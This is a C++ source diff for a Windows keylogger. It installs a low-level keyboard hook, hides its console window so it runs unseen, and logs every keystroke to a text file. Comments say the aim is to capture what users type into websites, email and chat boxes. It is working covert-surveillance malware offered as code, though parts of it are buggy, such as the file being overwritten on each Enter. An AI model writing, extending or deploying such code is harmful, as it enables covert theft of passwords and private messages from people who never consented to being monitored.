@@ -1,4 +1,5 @@
 #include<iostream>
+#include<fstream>
 #include<string>
 #include<Windows.h>
 #include<string>
@@ -7,10 +8,19 @@
 
 using namespace std;
 string str = "";
+const string logFileName = "HookerLogs.txt";
 static bool capsLockPressed = false;
 static bool isShiftPress = false;
+ofstream outStream;
+const int maxAllowedStringLenght = 50;
 HHOOK hHook = NULL;
-int main() {
+
+int main(){
+	
+	//Hide the console window and make it run at background 
+	//If you execute the .exe file stop the process manualy
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//Open the file stream 
 	//Define the keyboard hook
 	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HoockCallback, NULL, 0);
 	if (hHook == NULL) {
@@ -20,6 +30,9 @@ int main() {
 	{
 
 	}
+	outStream.open(logFileName);
+	outStream << str;
+	outStream.close();
 }
 LRESULT CALLBACK HoockCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 	KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT *)lParam);
@@ -44,8 +57,7 @@ LRESULT CALLBACK HoockCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 	dwMsg += cKey.scanCode << 16;
 	dwMsg += cKey.flags << 24;
 	int i = GetKeyNameText(dwMsg, (LPTSTR)lpszName, bufferSize);
-	cout << cKey.vkCode << "  " << lpszName <<  endl;
-	ProcessEvent(lpszName, cKey.vkCode, str, wParam);
+	ProcessEvent(lpszName, cKey.vkCode, str, wParam, outStream);
 	return CallNextHookEx(hHook, nCode, wParam, lParam);
 }
 
@@ -53,7 +65,8 @@ LRESULT CALLBACK HoockCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 void UpdateKeyState(BYTE *keystate, int keyCode) {
 	keystate[keyCode] = GetKeyState(keyCode); // getin the state of the key
 }
-void ProcessEvent(char* lpszName,int codeNum, string& str, WPARAM wParam) {
+
+void ProcessEvent(char* lpszName,int codeNum, string& str, WPARAM wParam,ofstream &outputSteam) {
 	// we need to record the input in more meaningfull format than just chars
 	//if enter is pressed, we can asume that a message or input data are send somewhere - website email chatbox
 	//end we record that 
@@ -69,12 +82,16 @@ void ProcessEvent(char* lpszName,int codeNum, string& str, WPARAM wParam) {
 		break;
 	case 32: str += " "; // add emty string 
 		break;
-	case 13: str += "\n"; // Enter add new line, for better reading
-		cout << str << endl;
+	case 13: //Enter
+		//Write to the file. Later this will be changed, but for now on enter press write new line		
+		outStream.open(logFileName);
+		outStream <<str;
+		outStream << "\r\n";
+		outStream.close();
 		break;
-	case 8: str += " ";
-		str += lpszName;
-		str += " ";
+	case 8: //Backspace
+		//remove the last char of str
+		str[str.size() - 1] = NULL;
 		break;
 	case 9 :
 		str += " "; // Tab. Very often used by user when the go form one input field to other
@@ -90,8 +107,7 @@ void ProcessEvent(char* lpszName,int codeNum, string& str, WPARAM wParam) {
 		else {
 			str += lpszName;
 		}
+			
 		break;
 	}
-
-	
 }
